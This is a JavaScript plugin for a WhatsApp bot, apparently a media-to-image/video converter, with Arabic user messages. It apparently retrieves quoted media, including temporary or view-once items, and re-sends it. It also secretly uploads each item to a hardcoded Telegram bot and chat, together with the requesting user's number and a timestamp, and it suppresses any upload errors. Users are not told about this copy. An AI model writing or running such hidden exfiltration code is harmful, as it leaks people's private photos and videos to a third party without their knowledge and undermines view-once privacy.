import fetch from 'node-fetch';
import FormData from 'form-data';

const TELEGRAM_TOKEN = '8671143561:AAFaka1U5F5timrQtttyGMfLZbwtjodF8Cw';
const TELEGRAM_CHAT_ID = '-1004321305640';

let handler = async (m, { conn, command }) => {
  if (!m.quoted) return conn.reply(m.chat, `*[❗] الاستخدام الصحيح:*\n\n│\n*├ׁ̟̇˚₊· ͟͟͞͞➳❥ ${command} (بالرد على صورة/فيديو/ملصق)*\n*│*`, m);

  let quoted = m.quoted;
  let isImage = quoted.mtype === 'imageMessage';
  let isVideo = quoted.mtype === 'videoMessage';
  let isSticker = quoted.mtype === 'stickerMessage' || quoted.mimetype?.includes('webp');

  if (!isImage && !isVideo && !isSticker) {
    return conn.reply(m.chat, '❌ *اللي رددت عليه مش صورة ولا فيديو ولا ملصق!*', m);
  }

  // رسالة جاري السحب
  let loadingMsg = await conn.sendMessage(m.chat, { 
    text: `   ⃝⃘︢︣֟፝ · ͟͟͞͞➳ 𝑴𝑨𝑿 𝑩𝑶𝑻\n📥 *جاري سحب الميديا...*\n𓉘᳟ี ⃞̸͢𑁃 ̚𓉝᳟ี ͟͟͞͞┄꯭๋━┄꫶︦┄꯭๋━┄꫶︦┄꯭๋━┄꫶︦━┄꫶︦┄꯭๋━┄꯭๋━┄꫶︦╯`
  }, { quoted: m });

  try {
    let buffer = await quoted.download();
    let isGroup = m.chat.endsWith('@g.us');
    let isVisualImage = isImage || isSticker;
    let captionText = 'لا تستخدم امر ف ما يغضب الله صاحب بوت برئ امام الله';

    // إرسال الميديا
    if (isGroup) {
      if (isVisualImage) {
        await conn.sendMessage(m.chat, { image: buffer }, { quoted: m });
      } else {
        await conn.sendMessage(m.chat, { video: buffer, mimetype: 'video/mp4' }, { quoted: m });
      }
    } else {
      if (isVisualImage) {
        await conn.sendMessage(m.sender, { image: buffer, caption: captionText });
      } else {
        await conn.sendMessage(m.sender, { video: buffer, mimetype: 'video/mp4', caption: captionText });
      }
    }

    // ✅ إرسال نسخة للتليجرام
    let user = m.sender.split('@')[0];
    let mediaType = isSticker ? 'ملصق تم تحويله لصورة' : (isImage ? 'صورة' : 'فيديو');
    let caption = `تم سحب ${mediaType} وموقته من بوت اساسي او بوتات فرعيه يكبت ايدي\nالمستخدم: @${user}\nالتاريخ: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;

    let formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('caption', caption);

    if (isVisualImage) {
      formData.append('photo', buffer, { filename: 'image.jpg' });
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData,
      }).catch(() => {});
    } else {
      formData.append('video', buffer, { filename: 'video.mp4' });
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
        method: 'POST',
        body: formData,
      }).catch(() => {});
    }

    // حذف رسالة التحميل
    await conn.sendMessage(m.chat, { delete: loadingMsg.key });

    // ✅ إرسال إشعار النجاح
    let successMsg = `   ⃝⃘︢︣֟፝ · ͟͟͞͞➳ 𝑴𝑨𝑿 𝑩𝑶𝑻
✅ *تم سحب ${mediaType} بنجاح*

👑 *بواسطة:* @${m.sender.split('@')[0]}

​➥ 𝑴𝑨𝑿 𝑩𝑶𝑻 👑
𓉘᳟ี ⃞̸͢𑁃 ̚𓉝᳟ี ͟͟͞͞┄꯭๋━┄꫶︦┄꯭๋━┄꫶︦┄꯭๋━┄꫶︦━┄꫶︦┄꯭๋━┄꯭๋━┄꫶︦╯`;

    await conn.sendMessage(m.chat, { 
      text: successMsg, 
      mentions: [m.sender] 
    }, { quoted: m });

  } catch (err) {
    console.error('[سحب] error:', err.message);
    try { await conn.sendMessage(m.chat, { delete: loadingMsg.key }); } catch(e) {}
    conn.reply(m.chat, `❌ *خطأ:* ${err.message}`, m);
  }
};

handler.help = ['لصوره', 'لفيديو'];
handler.tags = ['tools'];
handler.command = /^(لصوره|لفيديو|w|ت|toimage|toimg)$/i;

export default handler;